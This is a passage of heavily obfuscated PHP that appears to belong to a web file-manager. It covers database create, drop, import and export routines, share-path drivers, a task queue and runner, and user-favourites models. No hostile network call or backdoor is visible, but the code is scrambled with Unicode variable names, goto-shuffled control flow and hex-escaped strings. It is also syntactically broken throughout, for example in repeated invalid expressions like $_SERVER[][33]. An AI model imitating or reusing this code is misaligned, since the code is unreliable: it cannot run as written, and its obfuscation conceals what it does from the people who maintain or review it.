$fڽߊ[1025], $fڽߊ[1026], $fڽߊ[1027], $fڽߊ[1028], $fڽߊ[1029], $fڽߊ[1030], $fڽߊ[1031], $fڽߊ[1032]), array($this->parseTable("{$Aͣ[$fڽߊ[277]]}"), $this->parseDistinct(isset($Aͣ[$fڽߊ[1033]]) ? $Aͣ[$fڽߊ[1033]] : !1), $this->parseField(!empty($Aͣ[$fڽߊ[271]]) ? $Aͣ[$fڽߊ[271]] : $fڽߊ[182]), $this->parseJoin(!empty($Aͣ[$fڽߊ[280]]) ? $Aͣ[$fڽߊ[280]] : $fڽߊ[33]), $this->parseWhere(!empty($Aͣ[$fڽߊ[273]]) ? $Aͣ[$fڽߊ[273]] : $fڽߊ[33]), $this->parseGroup(!empty($Aͣ[$fڽߊ[509]]) ? $Aͣ[$fڽߊ[509]] : $fڽߊ[33]), $this->parseHaving(!empty($Aͣ[$fڽߊ[1034]]) ? $Aͣ[$fڽߊ[1034]] : $fڽߊ[33]), $this->parseOrder(!empty($Aͣ[$fڽߊ[363]]) ? $Aͣ[$fڽߊ[363]] : $fڽߊ[33]), $this->parseLimit(!empty($Aͣ[$fڽߊ[290]]) ? $Aͣ[$fڽߊ[290]] : $fڽߊ[33]), $this->parseUnion(!empty($Aͣ[$fڽߊ[345]]) ? $Aͣ[$fڽߊ[345]] : $fڽߊ[33]), $this->parseComment(!empty($Aͣ[$fڽߊ[352]]) ? $Aͣ[$fڽߊ[352]] : $fڽߊ[33])), $d); return $d; } public function getLastSql($dߛ毆 = '') { return $dߛ毆 ? $this->modelSql[$dߛ毆] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($c) { return addslashes($c); } public function setModel($F̈́) { $this->model = $F̈́; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($eŎݡ, $F = '') { $this->database = $eŎݡ; $this->type = $F; } public function model($cѺ = '') { return new ModelBase($cѺ, $_SERVER[][33], $this->database); } public function db($eƏ悴 = false) { goto c靥; c靥: $b݇ =& $_SERVER[]; $A̞Ԭ = array_change_key_case($this->database); if ($this->type == $b݇[9] || !$eƏ悴) { return $this->model()->db(); } goto D; D: $B짴 = $A̞Ԭ[$b݇[948]]; $A̞Ԭ[$b݇[948]] = $b݇[33]; if ($A̞Ԭ[$b݇[773]] == $b݇[774]) { $AȠ = $A̞Ԭ[$b݇[775]]; $A̞Ԭ[$b݇[775]] = substr($AȠ, 0, strrpos($AȠ, $b݇[1035])); } goto Fȅƕ; Fȅƕ: $this->database = $A̞Ԭ; $C = $this->model()->db(); try { $d = $C->execute("\163\150\x6f\167\40\144\141\164\141\x62\x61\x73\x65\x73\40\154\151\153\x65\x20\x27{$B짴}\47"); } catch (Exception $c) { } goto E; Fþ: $this->database = $A̞Ԭ; $C->execute("\165\x73\x65\x20\x60{$B짴}\140"); return $C; goto Aҭ; E: if (!$d) { $C->execute("\143\162\145\x61\x74\x65\40\144\141\x74\x61\142\x61\x73\x65\40\140{$B짴}\x60"); } $A̞Ԭ[$b݇[948]] = $B짴; if ($A̞Ԭ[$b݇[773]] == $b݇[774]) { $A̞Ԭ[$b݇[775]] .= $b݇[1035] . $B짴; } goto Fþ; Aҭ: } public function createTable($aҥ, $E뜣ȿ = null) { $D䆪 =& $_SERVER[]; if (!IO::exist($aҥ)) { ActionCall($D䆪[1036], !0, 0); show_json(LNG($D䆪[1037]), !1); } $A = sqlSplit(IO::getContent($aҥ)); foreach ($A as $e沵ź) { if ($E뜣ȿ) { $ạ = stripos($e沵ź, $D䆪[1038]) === 0; if ($ạ) { $E뜣ȿ->task[$D䆪[1039]] += 1; } } $this->model()->db()->execute($e沵ź); if ($E뜣ȿ && $ạ) { preg_match($D䆪[1040], $e沵ź, $B); $E뜣ȿ->task[$D䆪[1041]] = $B[1]; $E뜣ȿ->update(1); } } $this->taskToCache($E뜣ȿ); } public function insertTable($B⺎, $E킈 = null) { $A =& $_SERVER[]; $A׌ = $this->model()->db(); $f = $A ? array($A) : $A׌->getTables(); foreach ($B⺎ as $B) { $A = basename($B, $A[763]); if (!in_array($A, $f)) { continue; } if ($E킈) { $E킈->task[$A[1041]] = $A; } if (get_filesize($B) == 0) { continue; } $B￢ = $this->sqlToDb($B, $E킈); if (!$B￢) { ActionCall($A[1036], !0, 0); show_json(LNG($A[1042]) . "\133{$A}\135", !1); } } $this->taskToCache($E킈); } public function sqlFromDb($a˶Ϝ, $A, $E󷕄 = null, $Cؠ = null) { goto e; A֧: $DѨʮ = 0; $E = 10000; $EΌ = fopen($A, $_SERVER[][1043]); goto f; eḉ: fclose($EΌ); return $aֈǙ; goto b˺݇; f: $dǯ = $D->getPk(); $A  = $D->getDbFields(); do { $BǛ = array($dǯ => array($_SERVER[][990], $DѨʮ)); $cķ = $D->where($BǛ)->field($A )->order($dǯ . $_SERVER[][1044])->limit($E)->select(); $cķ = !empty($cķ) ? $cķ : array(); if (!($c = count($cķ))) { break; } $c = end($cķ); $DѨʮ = $c[$dǯ]; $cƹ = array(); foreach ($cķ as $d쌃) { if ($a˶Ϝ == $_SERVER[][1045] && $d쌃[$_SERVER[][29]] == $_SERVER[][1046]) { $Bޘ𡍨 = json_decode($d쌃[$_SERVER[][372]], !0); if ($Bޘ𡍨[$_SERVER[][28]] == date($_SERVER[][728]) && !$Bޘ𡍨[$_SERVER[][727]]) { continue; } } if ($Cؠ) { $d쌃[$_SERVER[][76]] = "\x7b\x69\157\72{$Cؠ}\x7d" . substr($d쌃[$_SERVER[][76]], strlen("\x7b\x69\157\x3a{$d쌃[$_SERVER[][801]]}\x7d")); $d쌃[$_SERVER[][801]] = $Cؠ; } $cƹ[] = $_SERVER[][1047] . $this->sqlEncode($d쌃) . $_SERVER[][1048]; } $B퓋 = "\111\116\x53\x45\x52\124\x20\111\x4e\x54\117\40\x60{$a˶Ϝ}\x60\40\x28\140" . implode($_SERVER[][1049], $A ) . $_SERVER[][1050]; fwrite($EΌ, $B퓋 . implode($_SERVER[][1051], $cƹ) . $_SERVER[][68] . PHP_EOL); $aֈǙ += $c; if ($E󷕄) { $E󷕄->update($c); } } while ($E == $c); goto eḉ; e: if ($E󷕄) { $E󷕄->task[$_SERVER[][1041]] = $a˶Ϝ; } $D = $this->model($a˶Ϝ); $aֈǙ = 0; goto A֧; b˺݇: } public function sqlToDb($F, $BϚ҂ = null) { goto A̯; C: $D = 0; $eﻲ = 4194304 - 104858; $B = 1000000 - 104858; goto D; B֟: return !0; goto b; e͵ִ: if (!$f) { return !1; } $d = 0; $D柷 = $Cϫ[33]; goto f׻; D: while (!feof($f)) { $Cć = trim(fgets($f)); if (!$Cć) { continue; } $Aٞա = $this->sqlDecode($Cć, $this->type); if (stripos($Aٞա, $Cϫ[353]) === 0) { if (!$D柷) { $D柷 = $Aٞա . $Cϫ[50]; } continue; } if ($BϚ҂) { $BϚ҂->task[$Cϫ[1039]] += 1; } $d++; $Eۖ[] = rtrim(rtrim(trim($Aٞա), $Cϫ[47]), $Cϫ[68]); $b׆݊ = null; $fܰϊ = strlen($Aٞա); $D += $fܰϊ; if ($D >= ($Bʛ == 500 ? $eﻲ : $B)) { $b׆݊ = array_pop($Eۖ); if ($d > 1) { $d--; } } if ($d >= $Bʛ || $b׆݊) { goto Eʑ; Fࠑ: $Eۖ = array(); $d = 0; $D = 0; goto B͢Ҫ; Eʑ: $Aٞա = $D柷 . implode($Cϫ[47], $Eۖ); if (!$dˎ->execute($Aٞա)) { return !1; } if ($BϚ҂) { $BϚ҂->update($d); } goto Fࠑ; B͢Ҫ: if ($b׆݊) { $Eۖ = array($b׆݊); $d = 1; $D = $fܰϊ; } goto FԼۤ; FԼۤ: } } fclose($f); if (!empty($Eۖ)) { $Aٞա = $D柷 . implode($Cϫ[47], $Eۖ); if (!$dˎ->execute($Aٞա)) { return !1; } if ($BϚ҂) { $BϚ҂->update($d); } } goto B֟; f׻: $Eۖ = array(); $Bʛ = $this->type == $Cϫ[9] ? 500 : 2000; $eؙӣ = basename($F, $Cϫ[763]); goto C; A̯: $Cϫ =& $_SERVER[]; $dˎ = $this->model()->db(); $f = @fopen($F, $Cϫ[1052]); goto e͵ִ; b: } public function dropTable($Cڈ = null) { $b鍡 = $this->model()->db(); $Bզ = $Cڈ ? array($Cڈ) : $b鍡->getTables(); if (!$Bզ) { return; } foreach ($Bզ as $Cڈ) { if ($Cڈ) { $Cڈ = strtolower($Cڈ); } else { continue; } $b鍡->execute("\x64\162\x6f\x70\40\164\141\142\x6c\x65\40\151\x66\40\145\170\x69\163\164\x73\40\140{$Cڈ}\140"); } } private function taskToCache($a̜ = null) { $Fʎ =& $_SERVER[]; if (!$a̜) { return; } $D = array($Fʎ[1041] => $a̜->task[$Fʎ[1041]], $Fʎ[1039] => $a̜->task[$Fʎ[1039]], $Fʎ[1053] => $a̜->task[$Fʎ[1053]]); if ($D[$Fʎ[1039]] == $D[$Fʎ[1053]]) { $D[$Fʎ[737]] = 1; } Cache::set($Fʎ[1054] . $a̜->task[$Fʎ[395]], $D); $a̜->end(); } private function sqlEncode($f) { $c򕣧 =& $_SERVER[]; $bɧ = array(); foreach ($f as $B㵬) { if (is_array($B㵬)) { $B㵬 = json_encode_force($B㵬); } $B㵬 = addslashes($B㵬); $B㵬 = str_replace(array($c򕣧[1055], $c򕣧[229]), array($c򕣧[1056], $c򕣧[1057]), $B㵬); $bɧ[] = str_replace($c򕣧[55], $c򕣧[1058], $B㵬); } return $c򕣧[55] . implode($c򕣧[1059], $bɧ) . $c򕣧[55]; } private function sqlDecode($Eͨ, $AƐ) { $AՄފ =& $_SERVER[]; $Eͨ = str_replace(array($AՄފ[1056], $AՄފ[1057]), array($AՄފ[1055], $AՄފ[229]), $Eͨ); if ($AƐ == $AՄފ[9]) { $Eͨ = stripslashes($Eͨ); } return $Eͨ; } } goto dî; dͪ׉: class PathDriverDbShareItem extends PathDriverDB { public function __construct($dЊ) { $this->pathParse = $dЊ; $this->model = Model($_SERVER[][1223]); } public function getPathOuter($c⎎) { $a킴 =& $_SERVER[]; if (!$c⎎) { return $c⎎; } $F = $this->parse($c⎎); return trim(KodIO::makeShare($this->pathParse[$a킴[395]], $F[$a킴[395]]), $a킴[8]); } protected function infoParse($b٭ˏ, $e = false, $C = false) { $EبȜ =& $_SERVER[]; $Dʓ = $this->pathParse[$EبȜ[395]]; $Bʞۅ = trim($this->pathParse[$EبȜ[1081]], $EبȜ[8]); return Action($EبȜ[1231])->sharePathInfo($Dʓ, $Bʞۅ); } public function infoFull($C) { $B֓ =& $_SERVER[]; $a = explode($B֓[8], trim($C, $B֓[8])); if (count($a) > 1) { $D = implode($B֓[8], array_splice($a, 1)); $Aۙߝ = $this->model->pathInfoByPath($a[0], $D); if (!$Aۙߝ) { return !1; } $this->pathParse[$B֓[1081]] = $Aۙߝ[$B֓[397]]; } return $this->infoParse($C); } public function listAll($Eڞ) { goto a; a: $Aߴ =& $_SERVER[]; $Fΐ = IO::info($this->pathParse[$Aߴ[76]]); if (!$Fΐ) { return array(); } goto d鐫ڏ; Dўܠ: foreach ($dЎ as &$E) { check_abort(); $E[$Aߴ[85]] = $Bō->_shareItemeParse($E[$Aߴ[85]], $cǗ); } unset($E); return $dЎ; goto aڂǆ; d鐫ڏ: $dЎ = $this->model->listAll($Eڞ); $cǗ = Model($Aߴ[589])->getInfo($Fΐ[$Aߴ[482]]); $Bō = Action($Aߴ[1231]); goto Dўܠ; aڂǆ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($c) { $this->pathParse = $c; $this->model = Model($_SERVER[][1223]); } protected function infoParse($f, $D = false, $a = false) { $F莝ǘ̏ =& $_SERVER[]; return Action($F莝ǘ̏[1087])->sharePathInfo($this->pathParse[$F莝ǘ̏[76]], !0); } public function listPath($E׋, $F񕄵 = false) { $D֓θ =& $_SERVER[]; $f = parent::listPath($E׋, $F񕄵); foreach ($f as $F => $Bʓ) { if (!in_array($F, array($D֓θ[74], $D֓θ[75]))) { continue; } foreach ($Bʓ as $b񍤯˶ => $Bڎ) { $f[$F][$b񍤯˶] = Action($D֓θ[1087])->shareItemInfo($Bڎ); } } return $f; } public function listAll($F琠) { goto D; aۧؓ: $c١Þ = $this->model->listAll($F琠); foreach ($c١Þ as &$A͌) { $A͌[$C֢[85]] = Action($C֢[1087])->shareItemInfo($A͌[$C֢[85]]); } unset($A͌); goto Cʵ; D: $C֢ =& $_SERVER[]; $aઇ = IO::info($this->pathParse[$C֢[76]]); if (!$aઇ) { return array(); } goto aۧؓ; Cʵ: return $c١Þ; goto B԰죰; B԰죰: } } class PathDriverDriverShareItem { public function __construct($E먿) { $this->pathParse = $E먿; } public function __call($b, $dӪü) { $F׫ =& $_SERVER[]; if (method_exists($this, $b)) { return; } $A׺Í = call_user_func_array(array($F׫[1232], $b), $dӪü); $CܗܩՈ = array($F׫[1233], $F׫[1234], $F׫[1235], $F׫[1236], $F׫[543], $F׫[545], $F׫[1237], $F׫[107], $F׫[1238], $F׫[1239]); if (in_array($b, $CܗܩՈ)) { $A׺Í = $this->getPathOuter($A׺Í); } return $A׺Í; } public function copy($dٳ, $Fݭ, $f̺Ɛ = false) { return $this->copyMove($dٳ, $Fݭ, $f̺Ɛ, $_SERVER[][543]); } public function move($Fׂڱȱ, $Ĉ, $Fҍ = false) { return $this->copyMove($Fׂڱȱ, $Ĉ, $Fҍ, $_SERVER[][545]); } private function copyMove($fˇǖ, $bϝ, $b, $E⬗) { goto C앖; aІڑ: return $c̣; goto a̧; D: if ($Fҷ->pathParse[$eի[1065]]) { $bϝ = $Fҷ->pathParse[$eի[1065]]; } else { $bϝ = $fٶ㤑; } $c̣ = IO::copyMove($fˇǖ, $bϝ, $b, $E⬗); $c̣ = $this->getPathOuter($c̣); goto aІڑ; C앖: $eի =& $_SERVER[]; $fٶ㤑 = $bϝ; $Fҷ = IO::driverMake($bϝ); goto D; a̧: } public function pathThis($B) { return get_path_this($this->pathParse[$_SERVER[][76]]); } public function pathFather($AЍ) { return get_path_father($this->pathParse[$_SERVER[][76]]); } public function iconvSystem($aݝί) { return $aݝί; } protected function infoParse($eҾ, $F܇˨ = false) { $D󬡕 =& $_SERVER[]; $e҈ÿ = $this->pathParse[$D󬡕[480]][$D󬡕[1088]] . $this->pathParse[$D󬡕[1081]]; if ($F܇˨) { $f캛 = IO::infoWithChildren($e҈ÿ); } else { $f캛 = IO::info($e҈ÿ); } $Eƹ = $this->pathParse[$D󬡕[480]]; return Action($D󬡕[1231])->_shareItemeParse($f캛, $Eƹ); } public function listAll($f) { $Aߜұ =& $_SERVER[]; $A־ = IO::listAll($f); $E = $this->pathParse[$Aߜұ[480]]; foreach ($A־ as &$d) { check_abort(); $a = IO::info($d[$Aߜұ[76]]); $a = is_array($a) ? $a : array(); $d = array_merge($a, $d); $d[$Aߜұ[85]] = Action($Aߜұ[1231])->_shareItemeParse($d, $E); } unset($d); return $A־; } public function getPathOuter($d) { goto aɑ; aɑ: $e箚 =& $_SERVER[]; $c = KodIO::parse($d); if ($c[$e箚[29]] == KodIO::KOD_SHARE_ITEM) { return $c[$e箚[76]]; } goto d; d: $BӃ = KodIO::clear($d); $c = KodIO::clear($this->pathParse[$e箚[480]][$e箚[1088]]); $cչ = substr($BӃ, strlen($c)); goto f; f: if (substr($BӃ, 0, strlen($c)) != $c) { return !1; } return $this->pathParse[$e箚[1082]] . $e箚[8] . ltrim($cչ, $e箚[8]); goto d; d: } public function getType() { $d =& $_SERVER[]; $E̞Ԥ = str_replace($d[72], $d[33], get_class($this)); return strtolower($E̞Ԥ); } public function isTypeObject($A) { return IO::isTypeObject($A); } public function info($E荐ّ) { return $this->infoParse($E荐ّ); } public function infoAuth($bȡɴ) { return $this->infoParse($bȡɴ); } public function infoWithChildren($a˦) { return $this->infoParse($a˦, !0); } public function infoFull($d߂) { return $this->infoParse($d߂); } } goto FË; b: class TaskHttp extends Task { protected function startAfter() { $Bա =& $_SERVER[]; $dݜ =& $this->task; $dݜ[$Bա[1615]] = 1; Hook::bind($Bա[1584], array($this, $Bա[1616])); Hook::bind($Bա[1586], array($this, $Bա[1617])); Hook::bind($Bա[1588], array($this, $Bա[1618])); } protected function endAfter() { $f =& $_SERVER[]; Hook::unbind($f[1584], array($this, $f[1616])); Hook::unbind($f[1586], array($this, $f[1617])); Hook::unbind($f[1588], array($this, $f[1618])); } public function progressStart($fǎ쇖) { $Bɢ =& $_SERVER[]; $a· = curl_getinfo($fǎ쇖); self::log($Bɢ[1619] . $a·[$Bɢ[305]]); self::valueSet($this->task[$Bɢ[395]], $this->task); } public function progressEnd($c֊) { $d֝ݭچ =& $_SERVER[]; self::log($d֝ݭچ[1620] . $this->task[$d֝ݭچ[395]]); $this->end(); } public function progress($d, $cږ, $BŔՎ, $E, $b✞) { $d뛬 =& $_SERVER[]; $bЄ =& $this->task; if ($b✞ > 0) { $bЄ[$d뛬[1039]] = $bЄ[$d뛬[1039]] == 0 ? $E : $bЄ[$d뛬[1039]]; $bЄ[$d뛬[1053]] = $b✞; } else { if ($BŔՎ > 0) { $bЄ[$d뛬[1039]] = $bЄ[$d뛬[1039]] == 0 ? $cږ : $bЄ[$d뛬[1039]]; $bЄ[$d뛬[1053]] = $BŔՎ; } } $this->update(); self::log("\x70\x72\x6f\x67\162\x65\163\x73\x48\x74\x74\x70\x3a\144\157\167\x6e\x3a{$BŔՎ}\x2f{$cږ}\x3b\40\165\x70\x6c\x6f\x61\x64\x3a{$b✞}\57{$E}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\153\x51\x75\145\x75\x65\114\x65\156\147\x74\x68"; const QUEUE_DATA = "\x74\141\163\x6b\121\x75\145\165\145\x44\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($FِЈ, $c = array(), $BƸ = '', $e􇔛 = '') { $Aں =& $_SERVER[]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($e􇔛 && array_find_by_field(self::$listData, $Aں[93], $e􇔛)) { return !0; } self::$listData[] = array($Aں[262] => $FِЈ, $Aں[1621] => $c, $Aں[445] => $BƸ, $Aں[93] => $e􇔛); return !0; } public static function addSubmit() { $FƩ =& $_SERVER[]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($FƩ[1622] . json_encode_force(array_to_keyvalue(self::$listData, $FƩ[33], $FƩ[445])), $FƩ[1623]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($D, $aβ = array(), $Fν = '', $Aы֏ = '') { goto Bӯ; B: self::setAll($bȴĎ); return !0; goto Eé; F֫: if ($Aы֏ && array_find_by_field($bȴĎ, $f螉[93], $Aы֏)) { return !0; } $bȴĎ[] = array($f螉[262] => $D, $f螉[1621] => $aβ, $f螉[445] => $Fν, $f螉[93] => $Aы֏); write_log($f螉[1622] . $Fν, $f螉[1623]); goto B; Bӯ: $f螉 =& $_SERVER[]; if (self::count() >= self::MAX_LENGTH) { return !1; } $bȴĎ = self::getAll(); goto F֫; Eé: } public static function run() { goto F侂Փ; e謂ړ: return !0; goto aʄ; F侂Փ: $f𨟗̌ =& $_SERVER[]; $c = self::getAll(); $fӠ = array_shift($c); goto fԈ蛏; Fи: try { Hook::apply($fӠ[$f𨟗̌[262]], $fӠ[$f𨟗̌[1621]]); } catch (Exception $a) { } $Bٖܵ = number_format(timeFloat() - $e͟, 3) . $f𨟗̌[1559]; write_log($f𨟗̌[1624] . $fӠ[$f𨟗̌[445]] . $f𨟗̌[1625] . $Bٖܵ, $f𨟗̌[1623]); goto e謂ړ; fԈ蛏: if (!$fӠ) { return !1; } self::setAll($c); $e͟ = timeFloat(); goto Fи; aʄ: } public static function count() { $BήՓ˝ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$BήՓ˝) { return 0; } return intval($BήՓ˝); } public static function getAll() { $E = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$E) { return array(); } return $E; } public static function setAll($D੷) { $eŭ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($D੷), $eŭ); Cache::set(self::QUEUE_DATA, $D੷, $eŭ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($cͥ, $E = 5.0) { if (!$cͥ) { return; } $f = Cache::get($cͥ); if (!$f || timeFloat() - floatVal($f) >= $E) { Cache::set($cͥ, timeFloat(), $E * 10); return !0; } return !1; } public static function timeLimitCall($B̝񉛑, $Dׄ, $B, $e = 5.0) { goto b⍯; A艷: Cache::set($E, $d, 60); Cache::removeMemory($E); write_log($Fڢ[1629] . $B̝񉛑 . $Fڢ[68] . $Dׄ, $Fڢ[1623]); goto FÅ; b⍯: $Fڢ =& $_SERVER[]; if (!$B̝񉛑 || !$Dׄ) { return; } self::$asyncAdd = !0; goto D; D: $E = $Fڢ[1626]; $d = Cache::get($E, !0); $Fޤ = array($Fڢ[1627] => timeFloat(), $Fڢ[1628] => timeFloat(), $Fڢ[262] => $Dׄ, $Fڢ[1621] => $B, $Fڢ[197] => $e); goto B߯; B߯: if (is_array($d[$B̝񉛑])) { $Fޤ[$Fڢ[1628]] = $d[$B̝񉛑][$Fڢ[1628]]; } if (is_array($d[$B̝񉛑])) { if (timeFloat() - $d[$B̝񉛑][$Fڢ[1627]] < $Fޤ[$Fڢ[197]] * 0.3) { return; } $Fޤ[$Fڢ[1628]] = $d[$B̝񉛑][$Fڢ[1628]]; } $d[$B̝񉛑] = $Fޤ; goto A艷; FÅ: } public static function timeLimitCallLoop() { goto eۇ΂; eۇ΂: $f熥 =& $_SERVER[]; $C = array($f熥[1630]); $c뼎 = in_array(strtolower(ACTION), $C); goto E; d: if (!$B) { return Cache::remove($A锭); } Cache::set($A锭, $B, 60); Cache::removeMemory($A锭); goto bۻ; E: if (!$c뼎 && !self::$asyncAdd) { return; } $A锭 = $f熥[1626]; $eؾ = Cache::get($A锭, !0); goto f͌; aǵن: $B = array(); foreach ($eؾ as $F => $eˮ) { if ($C - $eˮ[$f熥[1628]] > $eˮ[$f熥[197]]) { $D = !0; try { Hook::apply($eˮ[$f熥[262]], $eˮ[$f熥[1621]]); write_log($f熥[1631] . $F . $f熥[68] . $eˮ[$f熥[262]] . $f熥[1632] . ACTION, $f熥[1623]); } catch (Exception $fݽ) { } continue; } $B[$F] = $eˮ; } if (!$D) { return; } goto d; f͌: if (!$eؾ || count($eؾ) <= 0) { return; } $D = !1; $C = timeFloat(); goto aǵن; bۻ: } public static function finished($b斥ý, $C) { $DɅ௸ =& $_SERVER[]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($DɅ௸[262] => $b斥ý, $DɅ௸[1621] => $C); } private static function finishedRun() { $BԿ =& $_SERVER[]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $A늘) { try { Hook::apply($A늘[$BԿ[262]], $A늘[$BԿ[1621]]); } catch (Exception $FᴩϪ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto D۱; b: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($a֌) { $e紅 =& $_SERVER[]; return array($e紅[1822] => array(USER_ID, $e紅[2137])); } protected function listData() { $E͊ =& $_SERVER[]; $E = array($E͊[1537] => USER_ID, $E͊[477] => 0); $eƄ = $E͊[2138]; $f = $this->field($eƄ)->where($E)->order($E͊[2139])->select(); return $f ? $f : array(); } protected function resetCache() { } protected function listView() { goto e; c: $e = array($B[412] => array($B[413], $D˫)); $c = Model($B[809])->listSource($e, $a΋); $c = array_merge($c[$B[74]], $c[$B[75]]); goto C; cᵛ: $D˫ = array_to_keyvalue($a, $B[33], $B[76]); if (!$D˫) { return $E녬; } $a΋ = 2000; goto c; C: $c = array_to_keyvalue($c, $B[397]); foreach ($E녬 as $eǟ => $d) { $dł = $c[$d[$B[76]]]; $dł = $dł ? $dł : array(); $E녬[$eǟ] = array_merge($dł, $d); } return $E녬; goto C֝; e: $B =& $_SERVER[]; $E녬 = $this->listData(); $a = array_filter_by_field($E녬, $B[29], $B[411]); goto cᵛ; C֝: } protected function addFav($Cۨӡ, $F = '', $eуڌ = "\163\157\x75\x72\x63\x65") { goto e㻯; eڱ˟: $fȞя = array($B䄢[1537] => USER_ID, $B䄢[477] => 0); $F = $this->where($fȞя)->max($B䄢[1738]); if (!$F) { $F = 0; } goto A; A: if (!$F && $eуڌ == $B䄢[411]) { $A̢ = Model($B䄢[1223])->where(array($B䄢[412] => $Cۨӡ))->find(); if (!$A̢) { return !1; } $F = $A̢[$B䄢[28]]; } $F = $this->getAutoName($F); $cЕ = array($B䄢[1537] => USER_ID, $B䄢[477] => 0, $B䄢[415] => $F, $B䄢[416] => $Cۨӡ, $B䄢[417] => $eуڌ, $B䄢[1719] => $F + 1); goto Cۣ; Cۣ: return $this->add($cЕ); goto c铐; e㻯: $B䄢 =& $_SERVER[]; $fȞя = array($B䄢[1537] => USER_ID, $B䄢[477] => 0, $B䄢[417] => $eуڌ, $B䄢[416] => $Cۨӡ); if ($this->where($fȞя)->find()) { return !1; } goto eڱ˟; c铐: } protected function remove($CˤӉ) { $E̷ =& $_SERVER[]; $Dь = array($E̷[1537] => USER_ID, $E̷[414] => $CˤӉ); return $this->where($Dь)->delete(); } protected function removeByName($e񎵔) { $f브 =& $_SERVER[]; $cҔ = array($f브[1537] => USER_ID, $f브[415] => $e񎵔, $f브[477] => 0); return $this->where($cҔ)->delete(); } protected function rename($dة, $Cх) { $E٢ =& $_SERVER[]; if ($dة == $Cх) { return !1; } $e܋ = $this->getAutoName($Cх); if ($Cх != $e܋) { return !1; } $c = array($E٢[1537] => USER_ID, $E٢[477] => 0, $E٢[28] => $dة); return $this->where($c)->save(array($E٢[28] => $Cх)); } protected function resetSort($Bಌ) { $e懯 =& $_SERVER[]; $Bಌ = is_array($Bಌ) ? $Bಌ : array(); $aٴ = array($e懯[1537] => USER_ID); for ($Eކ = 0; $Eކ < count($Bಌ); $Eކ++) { $aٴ[$e懯[414]] = $Bಌ[$Eކ]; $this->where($aٴ)->save(array($e懯[1719] => $Eކ + 1)); } return !0; } protected function moveTop($F) { goto E; C: return $this->resetSort($d֐); goto Bƶ; B४: $aޏː = $d֐; $d֐ = array_remove_value($d֐, $d[$A괃[395]]); array_unshift($d֐, $d[$A괃[395]]); goto C; aؽ: if (!$d) { return; } $d֐ = $this->field($A괃[395])->where($aу)->order($A괃[2139])->select(); $d֐ = array_to_keyvalue($d֐, $A괃[33], $A괃[395]); goto B४; E: $A괃 =& $_SERVER[]; $aу = array($A괃[1537] => USER_ID, $A괃[477] => 0); $d = $this->where($aу)->where(array($A괃[28] => $F))->find(); goto aؽ; Bƶ: } protected function moveBottom($fÒ) { $f =& $_SERVER[]; $F = array($f[1537] => USER_ID, $f[477] => 0); $fи쎞 = $this->where($F)->max($f[1738]); $cȌ̒ = array($f[1738] => $fи쎞 + 1); return $this->where($F)->where(array($f[28] => $fÒ))->save($cȌ̒); } private function getAutoName($E) { goto AɎ͠; cӛ: return $E . "\50{$Aĕ}\51"; goto f抃; AɎ͠: $fډ =& $_SERVER[]; $f飝 = array($fډ[1537] => USER_ID, $fډ[477] => 0); $cΠ = $this->field($fډ[28])->where($f飝)->select(); goto e; e: $cΠ = array_to_keyvalue($cΠ, $fډ[33], $fډ[28]); if (!$cΠ || !in_array($E, $cΠ)) { return $E; } for ($Aĕ = 0; $Aĕ < count($cΠ); $Aĕ++) { if (!in_array($E . "\50{$Aĕ}\51", $cΠ)) { return $E . "\50{$Aĕ}\x29"; } } goto cӛ; f抃: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x6a\x6f\x62\114\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\144\x65\163\143", "\x73\x6f\162\164"); const JOB_KEY = "\163\145\x6c\x66\x4a\x6f\x62\x4c\151\x73\164"; public function listData($aΈ = false, $bĺӶܕ = "\163\x6f\162\164", $D׫ = false) { return parent::listData($aΈ, $bĺӶܕ, $D׫); } public function remove($EӃ) { return parent::remove($EӃ); } public function add($B) { $CԖ =& $_SERVER[]; if ($this->findByName($B[$CԖ[28]])) { return !1; } $B[$CԖ[1738]] = $this->getSort(); return parent::insert($B); } private function getSort() { $E =& $_SERVER[]; $bǌ = parent::listData(); $F⻼ = array_to_keyvalue($bǌ, $E[33], $E[1738]); return empty($F⻼) ? 0 : max($F⻼) + 1; } public function update($Dł, $F闷) { $d =& $_SERVER[]; $aȻ۪ = parent::listData($Dł); $Aゐ = $this->findByName($F闷[$d[28]]); if (!$aȻ۪ || $Aゐ && $Aゐ[$d[395]] != $aȻ۪[$d[395]]) { return !1; } return parent::update($Dł, $F闷); } public function setUserJob($cճ, $b) { goto Bܣ; Bܣ: $b쭚 =& $_SERVER[]; if (!is_array($b)) { $b = array($b); } $C͇ = parent::listData(); goto Cƻ; Cƻ: $Cɜ = array_to_keyvalue($C͇, $b쭚[28]); $A̠ܐ = $b쭚[376]; foreach ($b as $c֕) { if ($Cɜ[$c֕]) { $A̠ܐ .= $Cɜ[$c֕][$b쭚[395]] . $b쭚[47]; } else { $b = $this->add($c֕); $A̠ܐ .= $b . $b쭚[47]; } } goto F; F: $A̠ܐ = rtrim($A̠ܐ, $b쭚[47]); Model($b쭚[532])->metaSet($cճ, self::JOB_KEY, $A̠ܐ); goto fس; fس: } public function getUserJob($D×) { $a = Model($_SERVER[][532])->metaGet($D×); return 